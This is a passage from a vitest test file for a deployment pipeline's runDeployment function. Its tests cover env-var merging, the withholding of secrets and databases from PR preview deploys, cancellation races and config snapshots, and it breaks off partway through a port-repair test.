import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterAll, afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { auditLog, deployments, domains, services, serviceTargets } from '@ninedeploy/db';
import { logBus } from '../src/engine/logs.js';
import { filterTrustworthyProjectLinks, runDeployment, splitHookCommand } from '../src/engine/pipeline.js';
import { GithubAppError } from '../src/lib/githubApp.js';
import { githubAppCloneHint } from '../src/lib/sourceCreds.js';

const h = vi.hoisted(() => {
  // Loose `...args: any[]` signatures: individual tests install impls with
  // concrete param/return shapes — an untyped vi.fn() would pin `calls` to
  // `[][]` and reject every multi-arg mockImplementation under strict mode.
  const buildAndRun = vi.fn<(...args: any[]) => Promise<{ runtimeId: string; port: number | null; healthPath: string }>>(async () => ({ runtimeId: 'c-1', port: 3000, healthPath: '/' }));
  const isHealthy = vi.fn<(...args: any[]) => Promise<boolean>>(async () => true);
  const stop = vi.fn(async () => undefined);
  const builder = { buildAndRun, isHealthy, stop };
  const checkoutCommit = vi.fn(async () => 'sha-1234567');
  const decrypt = vi.fn((v: string) => `dec:${v}`);
  const connectionString = vi.fn(() => 'postgres://db/app');
  const ENGINES = {
    postgres: { port: 5432, username: () => 'nine', dbName: () => 'app' },
    mysql: { port: 3306, username: () => 'root', dbName: () => 'app' },
  };
  const writeDynamicConfig = vi.fn(async () => undefined);
  const getAcmeEmail = vi.fn(async () => null as string | null);
  const config: { paths: { reposDir: string; logsDir: string; dataDir: string }; wildcardDomain: string } = {
    paths: { reposDir: '', logsDir: '', dataDir: '' },
    wildcardDomain: '',
  };
  const agentOp = vi.fn<(...args: any[]) => Promise<{ exitCode: number; lines: string[] }>>(async () => ({ exitCode: 0, lines: [] }));
  const reconcileTemplateDependencies = vi.fn(async () => null as null | { database: { slug: string }; alreadyAttached: boolean });
  const railpackUnavailableReason = vi.fn(async () => null as string | null);
  // 0.13: only the GitHub App tests mint a token; anything else reaching it is a bug.
  const installationToken = vi.fn<(...args: any[]) => Promise<string>>(async () => {
    throw new Error('installationToken was not expected in this test');
  });
  // 0.13 (T5): the node transport is sealed unless a test says otherwise; a
  // per-job node token is revoked through this (never the network).
  const agentTransportSealed = vi.fn(async () => true);
  const revokeInstallationToken = vi.fn(async (..._args: unknown[]) => true);
  return { builder, checkoutCommit, decrypt, connectionString, ENGINES, writeDynamicConfig, getAcmeEmail, config, agentOp, reconcileTemplateDependencies, railpackUnavailableReason, installationToken, agentTransportSealed, revokeInstallationToken };
});

vi.mock('../src/config.js', () => ({ config: h.config }));
// The finalize grace period sleeps 2s in real life — stub it for tests.
const execMock = vi.hoisted(() => ({
  sleep: vi.fn(async () => undefined),
  run: vi.fn(async () => ({ stdout: '', stderr: '' })),
}));
const sleepMock = execMock;
vi.mock('../src/lib/exec.js', () => execMock);
vi.mock('../src/lib/crypto.js', () => ({ decrypt: h.decrypt }));
vi.mock('../src/lib/git.js', () => ({ checkoutCommit: h.checkoutCommit }));
vi.mock('../src/lib/githubApp.js', async (importOriginal) => ({
  ...(await importOriginal<typeof import('../src/lib/githubApp.js')>()),
  installationToken: h.installationToken,
  revokeInstallationToken: h.revokeInstallationToken,
}));
vi.mock('../src/lib/agentClient.js', () => ({ agentOp: h.agentOp, agentTransportSealed: h.agentTransportSealed }));
vi.mock('../src/engine/database.js', () => ({ connectionString: h.connectionString, ENGINES: h.ENGINES }));
vi.mock('../src/engine/builders/docker.js', () => ({ dockerBuilder: h.builder, railpackUnavailableReason: h.railpackUnavailableReason }));
vi.mock('../src/engine/builders/pm2.js', () => ({ pm2Builder: h.builder }));
vi.mock('../src/engine/builders/compose.js', () => ({ composeBuilder: h.builder }));
vi.mock('../src/engine/proxy.js', () => ({
  writeDynamicConfig: h.writeDynamicConfig,
  getAcmeEmail: h.getAcmeEmail,
}));
vi.mock('../src/engine/templateDependencies.js', () => ({
  reconcileTemplateDependencies: h.reconcileTemplateDependencies,
}));

const base = mkdtempSync(path.join(os.tmpdir(), 'nd-pipeline-'));
const reposDir = path.join(base, 'repos');
const logsDir = path.join(base, 'logs');
mkdirSync(logsDir, { recursive: true });
h.config.paths = { reposDir, logsDir, dataDir: base };

afterAll(() => {
  rmSync(base, { recursive: true, force: true });
});

const dep = {
  id: 1,
  serviceId: 5,
  status: 'queued',
  commitSha: null,
  message: null,
  author: null,
  trigger: 'manual',
  logPath: null,
  startedAt: null,
  finishedAt: null,
  createdAt: new Date(0),
};

const service = {
  id: 5,
  projectId: null,
  ownerUserId: 7,
  name: 'Web',
  slug: 'web',
  type: 'docker',
  status: 'idle',
  repoUrl: 'https://github.com/a/b.git',
  branch: 'main',
  commitSha: null,
  sourceId: null,
  image: null,
  volumeMount: null,
  port: 3000,
  healthPath: '/',
  runtimeId: null,
  cpuShares: 0,
  memLimitMb: 0,
  createdAt: new Date(0),
  updatedAt: new Date(0),
};

interface FakeDb {
  query: {
    deployments: { findFirst: ReturnType<typeof vi.fn>; findMany: ReturnType<typeof vi.fn> };
    services: { findFirst: ReturnType<typeof vi.fn> };
    buildConfigs: { findFirst: ReturnType<typeof vi.fn> };
    sources: { findFirst: ReturnType<typeof vi.fn> };
    serviceGithubLinks: { findFirst: ReturnType<typeof vi.fn> };
    githubAppInstallations: { findFirst: ReturnType<typeof vi.fn> };
    githubApps: { findFirst: ReturnType<typeof vi.fn> };
    envVars: { findMany: ReturnType<typeof vi.fn> };
    previewEnvVars: { findMany: ReturnType<typeof vi.fn> };
    databaseAttachments: { findMany: ReturnType<typeof vi.fn> };
    databases: { findFirst: ReturnType<typeof vi.fn> };
    domains: { findFirst: ReturnType<typeof vi.fn> };
    // The runtime-env sink re-verifies every project link against the
    // owner's workspace seats before decrypting shared env (cross-tenant
    // defence in depth).
    projects: { findFirst: ReturnType<typeof vi.fn> };
    serviceProjects: { findMany: ReturnType<typeof vi.fn> };
    workspaceMembers: { findFirst: ReturnType<typeof vi.fn> };
    users: { findFirst: ReturnType<typeof vi.fn> };
    settings: { findFirst: ReturnType<typeof vi.fn> };
  };
  select: ReturnType<typeof vi.fn>;
  update: ReturnType<typeof vi.fn>;
  insert: ReturnType<typeof vi.fn>;
}

function makeDb(): { db: FakeDb; updates: { table: unknown; values: Record<string, unknown> }[]; inserts: { table: unknown; values: Record<string, unknown> }[] } {
  const updates: { table: unknown; values: Record<string, unknown> }[] = [];
  const inserts: { table: unknown; values: Record<string, unknown> }[] = [];
  const db: FakeDb = {
    query: {
      deployments: { findFirst: vi.fn(), findMany: vi.fn().mockResolvedValue([]) },
      services: { findFirst: vi.fn() },
      buildConfigs: { findFirst: vi.fn() },
      sources: { findFirst: vi.fn() },
      // 0.13: clone credentials look for a GitHub App link first (none here).
      serviceGithubLinks: { findFirst: vi.fn().mockResolvedValue(undefined) },
      githubAppInstallations: { findFirst: vi.fn().mockResolvedValue(undefined) },
      githubApps: { findFirst: vi.fn().mockResolvedValue(undefined) },
      envVars: { findMany: vi.fn().mockResolvedValue([]) },
      // 0.12: the parent's preview-only set — read for PR previews only.
      previewEnvVars: { findMany: vi.fn().mockResolvedValue([]) },
      databaseAttachments: { findMany: vi.fn().mockResolvedValue([]) },
      databases: { findFirst: vi.fn().mockResolvedValue(undefined) },
      domains: { findFirst: vi.fn() },
      // Services carry N-N project links via `service_projects`; the pipeline
      // unions every linked project's shared env before the service's own.
      serviceProjects: { findMany: vi.fn().mockResolvedValue([]) },
      // Defaults describe an honest link: project #4 lives in workspace #1 and
      // the service's owner (#7) holds a seat there; the owner is not an
      // instance operator.
      projects: { findFirst: vi.fn().mockResolvedValue({ id: 4, workspaceId: 1 }) },
      workspaceMembers: { findFirst: vi.fn().mockResolvedValue({ id: 1, workspaceId: 1, userId: 7, role: 'member' }) },
      users: { findFirst: vi.fn().mockResolvedValue({ id: 7, isInstanceOperator: false }) },
      // r512: registry credentials are bound to hosts (the only setting the
      // pipeline reads here). Source #7 is bound to every host these tests use.
      settings: {
        findFirst: vi.fn().mockResolvedValue({
          key: 'registry_source_hosts',
          value: { '7': ['docker.io', 'ghcr.io', 'registry.local:5000'] },
        }),
      },
    },
    select: vi.fn(() => ({
      from: vi.fn(() => ({
        where: vi.fn(() => Promise.resolve([])),
        leftJoin: vi.fn(() => Promise.resolve([])),
        innerJoin: vi.fn(() => Promise.resolve([])),
        orderBy: vi.fn(() => Promise.resolve([])),
        // biome-ignore lint/suspicious/noThenProperty: intentional thenable — the fake DB query result must be awaitable by the code under test.
        then: (ok: (v: unknown) => unknown) => ok([]),
      })),
    })),
    update: vi.fn((table: unknown) => ({
      set: (values: Record<string, unknown>) => {
        updates.push({ table, values });
        return {
          where: vi.fn(() => ({
            // Success-path finalize guard: pretend the row was still `building`.
            returning: vi.fn().mockResolvedValue([{ id: 1 }]),
          })),
        };
      },
    })),
    insert: vi.fn((table: unknown) => ({
      values: (values: Record<string, unknown>) => {
        inserts.push({ table, values });
        return Promise.resolve();
      },
    })),
  };
  return { db, updates, inserts };
}

function collectLogs(id: number): string[] {
  const lines: string[] = [];
  logBus.subscribe(id, (line) => lines.push(line));
  return lines;
}

function baseSetup(db: FakeDb, over: Record<string, unknown> = {}) {
  db.query.deployments.findFirst.mockResolvedValue(dep);
  db.query.services.findFirst.mockResolvedValue({ ...service, ...over });
  db.query.buildConfigs.findFirst.mockResolvedValue(null);
  db.query.envVars.findMany.mockResolvedValue([]);
  db.query.databaseAttachments.findMany.mockResolvedValue([]);
}

describe('runDeployment env merging', () => {
  it('merges project-scope shared env under service env', async () => {
    const { db } = makeDb();
    baseSetup(db, { projectId: 4, image: 'nginx:latest' });
    // Project scope is resolved through the `service_projects` link table, not
    // the legacy `services.projectId` column.
    db.query.serviceProjects.findMany.mockResolvedValue([{ serviceId: 1, projectId: 4 }]);
    // Call order: config snapshot (service scope), project scope, service scope.
    let n = 0;
    db.query.envVars.findMany.mockImplementation(async () => {
      n++;
      if (n === 2) return [{ key: 'SHARED', valueEncrypted: 'enc:s', isSecret: true, scope: 'project' }];
      return [{ key: 'OWN', valueEncrypted: 'enc:o', isSecret: true, scope: 'service' }];
    });
    await runDeployment(db as never, 1);
    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { env: Record<string, string> };
    expect(ctx.env).toEqual({ SHARED: 'dec:enc:s', OWN: 'dec:enc:o' });
  });

  it('skips the project lookup for project-less services', async () => {
    const { db } = makeDb();
    baseSetup(db, { projectId: null, image: 'nginx:latest' });
    await runDeployment(db as never, 1);
    // Snapshot + service lookup only — no project-scope query.
    expect(db.query.envVars.findMany).toHaveBeenCalledTimes(2);
  });

  it('snapshots the effective config onto the deployment row', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { image: 'nginx:latest' });
    await runDeployment(db as never, 1);
    const building = updates.find((u) => u.values.status === 'building');
    expect(building).toBeDefined();
    const snapshot = JSON.parse(building!.values.configSnapshot as string) as Record<string, unknown>;
    expect(snapshot.image).toBe('nginx:latest');
    expect(snapshot.restartPolicy).toBe('unless-stopped');
    expect(snapshot.envKeys).toEqual([]);
  });
});

// r651: a PR preview is built from a branch anyone with push access wrote.
// Before the fix it decrypted the parent's project-shared secrets (it keeps the
// parent's project tags), resolved vault references copied from the parent's
// env, and received production's database through the attachment the manifest
// re-created on every preview deploy.
describe('runDeployment — PR preview credentials (r651)', () => {
  function previewDb(serviceOver: Record<string, unknown>) {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', ...serviceOver });
    db.query.serviceProjects.findMany.mockResolvedValue([{ serviceId: 5, projectId: 4 }]);
    let n = 0;
    db.query.envVars.findMany.mockImplementation(async () => {
      n++;
      if (n === 2) {
        return [
          { key: 'PROD_DB_PASSWORD', valueEncrypted: 'enc:pw', isSecret: true, scope: 'project' },
          { key: 'PUBLIC_FLAG', valueEncrypted: 'enc:flag', isSecret: false, scope: 'project' },
        ];
      }
      return [{ key: 'OWN', valueEncrypted: 'enc:o', isSecret: true, scope: 'service' }];
    });
    db.query.databaseAttachments.findMany.mockResolvedValue([{ id: 1, serviceId: 5, databaseId: 9, envAlias: 'DATABASE_URL' }]);
    db.query.databases.findFirst.mockResolvedValue({
      id: 9, name: 'prod-db', engine: 'postgres', status: 'running', ownerUserId: 7, projectId: null,
    });
    // The parent (#3) holds the same database — production's.
    (db.query.databaseAttachments as Record<string, unknown>).findFirst = vi.fn(async () => ({ id: 2, serviceId: 3, databaseId: 9 }));
    return db;
  }

  it('withholds project secrets, vault refs and the parent database from a preview, and says so in the deploy log', async () => {
    const db = previewDb({ isEphemeralPreview: true, previewParentServiceId: 3 });
    // A vault reference copied from the parent's non-secret service env.
    h.decrypt.mockImplementation((v: string) => (v === 'enc:o' ? ['$', '{{doppler:STRIPE_KEY}}'].join('') : `dec:${v}`));
    const logs = collectLogs(1);
    try {
      await runDeployment(db as never, 1);
    } finally {
      h.decrypt.mockImplementation((v: string) => `dec:${v}`);
    }
    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { env: Record<string, string> };
    expect(ctx.env).toEqual({ PUBLIC_FLAG: 'dec:enc:flag' });
    const line = logs.find((l) => l.includes('PR preview: withheld'));
    expect(line).toContain('project secret PROD_DB_PASSWORD');
    expect(line).toContain('vault reference OWN');
    expect(line).toContain('database prod-db (DATABASE_URL)');
    // Names only — never a value.
    expect(line).not.toContain('dec:enc:pw');
  });

  it('a production service still receives all of it', async () => {
    const db = previewDb({});
    db.query.users.findFirst.mockResolvedValue({ id: 7, isInstanceOperator: true });
    const logs = collectLogs(1);
    await runDeployment(db as never, 1);
    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { env: Record<string, string> };
    expect(ctx.env).toMatchObject({ PROD_DB_PASSWORD: 'dec:enc:pw', PUBLIC_FLAG: 'dec:enc:flag', DATABASE_URL: 'postgres://db/app' });
    expect(logs.some((l) => l.includes('PR preview: withheld'))).toBe(false);
  });

  it('keeps a separate database an admin attached to the preview on purpose', async () => {
    const db = previewDb({ isEphemeralPreview: true, previewParentServiceId: 3 });
    // Not on the parent, and the preview's owner owns it (owner ⇒ admin).
    (db.query.databaseAttachments as Record<string, unknown>).findFirst = vi.fn(async () => undefined);
    await runDeployment(db as never, 1);
    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { env: Record<string, string> };
    expect(ctx.env.DATABASE_URL).toBe('postgres://db/app');
  });
});

// 0.12 preview-only env: the parent's `preview_env_vars` rows reach its PR
// previews at deploy time — over the non-secret values the webhook copied —
// and never a production deploy. r651's withholding keeps holding.
describe('runDeployment — preview-only env (0.12)', () => {
  function setup(serviceOver: Record<string, unknown>) {
    const made = makeDb();
    const { db } = made;
    baseSetup(db, { image: 'nginx:latest', ...serviceOver });
    db.query.serviceProjects.findMany.mockResolvedValue([{ serviceId: 5, projectId: 4 }]);
    // Call order: config snapshot (service), project scope, service scope.
    let n = 0;
    db.query.envVars.findMany.mockImplementation(async () => {
      n++;
      if (n === 2) {
        return [
          { key: 'PROD_DB_PASSWORD', valueEncrypted: 'enc:pw', isSecret: true, scope: 'project' },
          { key: 'PUBLIC_FLAG', valueEncrypted: 'enc:flag', isSecret: false, scope: 'project' },
        ];
      }
      // The preview's own row: the parent's NON-secret value, copied by the webhook.
      return [{ key: 'API_URL', valueEncrypted: 'enc:prod-url', isSecret: false, scope: 'service' }];
    });
    db.query.previewEnvVars.findMany.mockResolvedValue([
      { id: 1, serviceId: 3, key: 'API_URL', valueEncrypted: 'enc:staging-url', isSecret: false },
      { id: 2, serviceId: 3, key: 'STRIPE_KEY', valueEncrypted: 'enc:test-stripe', isSecret: true },
      { id: 3, serviceId: 3, key: 'PUBLIC_FLAG', valueEncrypted: 'enc:preview-flag', isSecret: false },
    ]);
    return made;
  }

  beforeEach(() => {
    vi.clearAllMocks();
    h.decrypt.mockImplementation((v: string) => `dec:${v}`);
  });

  it('a preview receives the set over its copied values and project values; project secrets stay withheld', async () => {
    const { db, updates } = setup({ isEphemeralPreview: true, previewParentServiceId: 3 });
    const logs = collectLogs(1);
    await runDeployment(db as never, 1);
    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { env: Record<string, string> };
    expect(ctx.env).toEqual({
      API_URL: 'dec:enc:staging-url',
      STRIPE_KEY: 'dec:enc:test-stripe',
      PUBLIC_FLAG: 'dec:enc:preview-flag',
    });
    expect(logs.find((l) => l.includes('PR preview: withheld'))).toContain('project secret PROD_DB_PASSWORD');
    // The deploy diff names the preview-only keys (secret marked), never values.
    const building = updates.find((u) => u.values.status === 'building');
    const snapshot = JSON.parse(building!.values.configSnapshot as string) as Record<string, unknown>;
    expect(snapshot.previewEnvKeys).toEqual(['API_URL', 'PUBLIC_FLAG', 'STRIPE_KEY*']);
    expect(JSON.stringify(snapshot)).not.toContain('staging-url');
  });

  it('a vault reference that reached the set is still dropped for the preview', async () => {
    const { db } = setup({ isEphemeralPreview: true, previewParentServiceId: 3 });
    h.decrypt.mockImplementation((v: string) => (v === 'enc:test-stripe' ? ['$', '{{doppler:STRIPE_KEY}}'].join('') : `dec:${v}`));
    await runDeployment(db as never, 1);
    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { env: Record<string, string> };
    expect(ctx.env).not.toHaveProperty('STRIPE_KEY');
  });

  it('a production service never reads the set, and its env and snapshot are unchanged', async () => {
    const { db, updates } = setup({});
    db.query.users.findFirst.mockResolvedValue({ id: 7, isInstanceOperator: true });
    await runDeployment(db as never, 1);
    expect(db.query.previewEnvVars.findMany).not.toHaveBeenCalled();
    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { env: Record<string, string> };
    expect(ctx.env).toEqual({ PROD_DB_PASSWORD: 'dec:enc:pw', PUBLIC_FLAG: 'dec:enc:flag', API_URL: 'dec:enc:prod-url' });
    const building = updates.find((u) => u.values.status === 'building');
    const snapshot = JSON.parse(building!.values.configSnapshot as string) as Record<string, unknown>;
    expect(snapshot).not.toHaveProperty('previewEnvKeys');
  });

  it('a preview without a parent link (or an empty set) deploys exactly as before', async () => {
    const { db, updates } = setup({ isEphemeralPreview: true, previewParentServiceId: null });
    await runDeployment(db as never, 1);
    expect(db.query.previewEnvVars.findMany).not.toHaveBeenCalled();
    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { env: Record<string, string> };
    expect(ctx.env).toEqual({ PUBLIC_FLAG: 'dec:enc:flag', API_URL: 'dec:enc:prod-url' });
    const building = updates.find((u) => u.values.status === 'building');
    expect(JSON.parse(building!.values.configSnapshot as string)).not.toHaveProperty('previewEnvKeys');
  });
});

describe('runDeployment', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    logBus.removeAllListeners();
    h.config.wildcardDomain = '';
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'c-1', port: 3000, healthPath: '/' }));
    h.builder.isHealthy.mockImplementation(async () => true);
    h.builder.stop.mockImplementation(async () => undefined);
    h.checkoutCommit.mockImplementation(async () => 'sha-1234567');
    h.writeDynamicConfig.mockImplementation(async () => undefined);
    h.getAcmeEmail.mockImplementation(async () => null);
    h.connectionString.mockImplementation(() => 'postgres://db/app');
  });

  afterEach(() => {
    logBus.removeAllListeners();
  });

  it('treats a deployment row deleted mid-flight as cancelled (stops the zombie pipeline)', async () => {    const { db, updates } = makeDb();
    baseSetup(db, { image: 'nginx:latest', port: null, runtimeId: null });
    // The entry lookup sees the row; every later read (the cancel checkpoints)
    // sees NOTHING — the operator cancelled the deploy and removed the already
    // terminal row while this pipeline was still running.
    let reads = 0;
    db.query.deployments.findFirst.mockImplementation(async () => (reads++ === 0 ? dep : undefined));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    // The zombie must stop at the FIRST checkpoint, before any build starts —
    // otherwise it holds its concurrency slot and the queued deploys behind it
    // never proceed.
    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
    expect(lines).toContain('⏹ Deployment cancelled');
    expect(updates.map((u) => [u.table, u.values.status])).toEqual([
      [deployments, 'building'],
      [services, 'deploying'],
      [services, 'idle'],
      [deployments, 'cancelled'],
    ]);
  });

  it('r404: a cancel landing between the claim and the first status write survives', async () => {
    // The worker's claim flipped queued→building; the cancel route flipped
    // building→cancelled milliseconds later — before this pipeline's own
    // status write. That write used to resurrect `building` unconditionally
    // and the cancelled deploy ran to a green finish.
    const { db, updates } = makeDb();
    baseSetup(db, { image: 'nginx:latest', port: null, runtimeId: null });
    const origUpdate = db.update;
    (db as unknown as { update: typeof origUpdate }).update = vi.fn((table: unknown) => {
      const chain = origUpdate(table as never);
      return {
        set: (values: Record<string, unknown>) => {
          if (table === deployments && values.status === 'building') {
            // The conditional claim write matches ZERO rows: the cancel won.
            return { where: () => ({ returning: () => Promise.resolve([]) }) };
          }
          return chain.set(values);
        },
      };
    });
    // Entry lookup sees the queued row; every checkpoint read sees cancelled.
    db.query.deployments.findFirst
      .mockResolvedValueOnce(dep)
      .mockResolvedValue({ ...dep, status: 'cancelled' });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
    expect(lines.some((l) => l.startsWith('▶ Deployment'))).toBe(false);
    expect(lines).toContain('⏹ Deployment cancelled');
    expect(updates.map((u) => [u.table, u.values.status])).toEqual([
      [services, 'idle'],
      [deployments, 'cancelled'],
    ]);
  });

  it('returns early when the deployment row is missing', async () => {
    const { db, updates } = makeDb();
    db.query.deployments.findFirst.mockResolvedValue(undefined);

    await runDeployment(db as never, 1);

    expect(db.query.services.findFirst).not.toHaveBeenCalled();
    expect(updates).toHaveLength(0);
    expect(h.checkoutCommit).not.toHaveBeenCalled();
    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
  });

  it('returns early when the service row is missing', async () => {
    const { db, updates } = makeDb();
    db.query.deployments.findFirst.mockResolvedValue(dep);
    db.query.services.findFirst.mockResolvedValue(undefined);

    await runDeployment(db as never, 1);

    expect(updates).toHaveLength(0);
    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
  });

  it('fails the deployment for an unknown service type', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { type: 'k8s' });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('▶ Deployment #1 for "Web" (k8s)');
    expect(lines).toContain('✗ Unknown service type: k8s');
    expect(updates.map((u) => [u.table, u.values.status])).toEqual([
      [deployments, 'building'],
      [services, 'deploying'],
      [deployments, 'failed'],
      [services, 'error'],
    ]);
    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
  });

  it('deploys an image-based service without touching git', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { image: 'nginx:latest', port: null });
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'c-1', port: null, healthPath: '/' }));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(h.checkoutCommit).not.toHaveBeenCalled();
    expect(h.builder.buildAndRun).toHaveBeenCalledTimes(1);
    const [ctx, previous] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>, unknown];
    expect(ctx.commitSha).toBe('');
    expect(ctx.workDir).toBe(path.join(reposDir, '5'));
    expect(previous).toBeUndefined();
    expect(lines).toContain('Image deploy from nginx:latest');
    expect(lines).toContain('Running healthcheck …');
    expect(lines).toContain('✓ Deployment successful');

    const svcUpdate = updates.find((u) => u.table === services && u.values.status === 'running');
    expect(svcUpdate?.values).toMatchObject({ runtimeId: 'c-1', port: null, commitSha: '', runtimeReplicas: 1 });
    const depUpdate = updates.find((u) => u.table === deployments && u.values.status === 'running');
    expect(depUpdate?.values.finishedAt).toBeInstanceOf(Date);
    expect(h.writeDynamicConfig).toHaveBeenCalledWith(db);
    expect(db.query.domains.findFirst).not.toHaveBeenCalled();
  });

  it('records the replica count the runtime actually achieved', async () => {
    // The proxy renders runtimeReplicas (never the desired count), so the
    // finalize step must persist what the builder reported — a replica that
    // failed to start must not linger as a dead round-robin backend.
    const { db, updates } = makeDb();
    baseSetup(db, { image: 'nginx:latest', port: null, replicas: 3 });
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'c-1', port: null, healthPath: '/', replicas: 2 }));

    await runDeployment(db as never, 1);

    const svcUpdate = updates.find((u) => u.table === services && u.values.status === 'running');
    expect(svcUpdate?.values).toMatchObject({ runtimeId: 'c-1', runtimeReplicas: 2 });
  });

  it('demotes older running rows to superseded when the build goes live', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { image: 'nginx:latest' });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 3000, healthPath: '/' });

    await runDeployment(db as never, 1);

    // The finalize itself flips THIS row to running; a sibling update demotes
    // every OTHER running row of the service so history no longer shows past
    // deploys as still-Running.
    expect(updates.some((u) => u.table === deployments && u.values.status === 'running')).toBe(true);
    const demote = updates.find((u) => u.table === deployments && u.values.status === 'superseded');
    expect(demote).toBeDefined();
  });

  it('stores a managed-env fingerprint and warns loudly when it drifts', async () => {
    const wpMapping = {
      WORDPRESS_DB_HOST: 'host',
      WORDPRESS_DB_USER: 'username',
      WORDPRESS_DB_PASSWORD: 'password',
      WORDPRESS_DB_NAME: 'database',
    };
    const dbRow = {
      id: 2,
      engine: 'mysql',
      status: 'running',
      containerName: 'nd-db-web-db',
      internalHost: 'nd-db-web-db',
      internalPort: 3306,
      username: 'nine',
      dbName: 'app',
      passwordEncrypted: 'enc:secret-one',
    };

    // ── First deploy: capture the fingerprint persisted onto its row. ──
    const first = makeDb();
    baseSetup(first.db, { image: 'nginx:latest' });
    first.db.query.services.findFirst.mockResolvedValue({
      ...service,
      image: 'nginx:latest',
      templateId: 'wordpress',
      templateDatabaseEnv: wpMapping,
    });
    first.db.query.databaseAttachments.findMany.mockResolvedValue([{ serviceId: 5, databaseId: 2, envAlias: 'DATABASE_URL' }]);
    first.db.query.databases.findFirst.mockResolvedValue(dbRow);
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-1', port: 3000, healthPath: '/' });

    await runDeployment(first.db as never, 1);

    const snap1Update = first.updates.find((u) => u.table === deployments && u.values.status === 'running');
    const snap1 = JSON.parse(snap1Update!.values.configSnapshot as string) as { managedEnv: Record<string, string> };
    expect(Object.keys(snap1.managedEnv).sort()).toEqual([
      'WORDPRESS_DB_HOST', 'WORDPRESS_DB_NAME', 'WORDPRESS_DB_PASSWORD', 'WORDPRESS_DB_USER',
    ]);

    // ── Second deploy with the SAME volume-backed app but the managed DB's
    // stored password changed underneath it: the old wp-config.php baked on
    // first boot can no longer authenticate, and the operator needs to know
    // WHY a green deploy broke their site. ──
    const second = makeDb();
    baseSetup(second.db, {
      image: 'nginx:latest',
      templateId: 'wordpress',
      templateDatabaseEnv: wpMapping,
    });
    second.db.query.deployments.findFirst.mockResolvedValue({ ...dep, configSnapshot: JSON.stringify(snap1) });
    // The drift check scans recent snapshot-bearing rows for one carrying a
    // fingerprint; the previous successful deploy's row supplies it here.
    second.db.query.deployments.findMany.mockResolvedValue([{ ...dep, configSnapshot: JSON.stringify(snap1) }]);
    second.db.query.databaseAttachments.findMany.mockResolvedValue([{ serviceId: 5, databaseId: 2, envAlias: 'DATABASE_URL' }]);
    second.db.query.databases.findFirst.mockResolvedValue({ ...dbRow, passwordEncrypted: 'enc:secret-two' });
    second.db.query.serviceProjects.findMany.mockResolvedValue([]);
    const lines2 = collectLogs(1);

    await runDeployment(second.db as never, 1);

    expect(lines2.some((l) => l.includes('Managed database value "WORDPRESS_DB_PASSWORD" differs'))).toBe(true);
    expect(lines2.some((l) => l.includes('wp-config.php'))).toBe(true);
    // And the fresh fingerprint is persisted so chains of redeploys keep comparing.
    const snap2Update = second.updates.find((u) => u.table === deployments && u.values.status === 'running');
    const snap2 = JSON.parse(snap2Update!.values.configSnapshot as string) as { managedEnv: Record<string, string> };
    expect(snap2.managedEnv.WORDPRESS_DB_PASSWORD).not.toBe(snap1.managedEnv.WORDPRESS_DB_PASSWORD);
  });

  it('keeps the full config snapshot when persisting the managed-env fingerprint', async () => {
    // The finalize update used to REPLACE the claim-time snapshot with
    // `{managedEnv}` alone — the /diff endpoint then lost the build-config
    // diff for every template- or database-attached service.
    const wpMapping = {
      WORDPRESS_DB_HOST: 'host',
      WORDPRESS_DB_USER: 'username',
      WORDPRESS_DB_PASSWORD: 'password',
      WORDPRESS_DB_NAME: 'database',
    };
    const fake = makeDb();
    baseSetup(fake.db, {
      image: 'nginx:latest',
      templateId: 'wordpress',
      templateDatabaseEnv: wpMapping,
    });
    fake.db.query.databaseAttachments.findMany.mockResolvedValue([{ serviceId: 5, databaseId: 2, envAlias: 'DATABASE_URL' }]);
    fake.db.query.databases.findFirst.mockResolvedValue({
      id: 2,
      engine: 'mysql',
      status: 'running',
      containerName: 'nd-db-web-db',
      internalHost: 'nd-db-web-db',
      internalPort: 3306,
      username: 'nine',
      dbName: 'app',
      passwordEncrypted: 'enc:secret-one',
    });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-1', port: 3000, healthPath: '/' });

    await runDeployment(fake.db as never, 1);

    const snapUpdate = fake.updates.find((u) => u.table === deployments && u.values.status === 'running');
    const snap = JSON.parse(snapUpdate!.values.configSnapshot as string) as Record<string, unknown>;
    expect(snap.managedEnv).toBeDefined();
    // The claim-time snapshot fields must survive the merge.
    expect(snap.buildPack).toBe('auto');
    expect(Array.isArray(snap.envKeys)).toBe(true);
    expect(snap.image).toBe('nginx:latest');
  });

  it('persists a runtime port repaired during the healthcheck', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { image: 'n8nio/n8n', port: 80 });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'n8n-1', port: 80, healthPath: '/' });
    h.builder.isHealthy.mockImplementation(async (runtime: { port: number | null }) => {
      runtime.port = 5678;
      return true;
    });

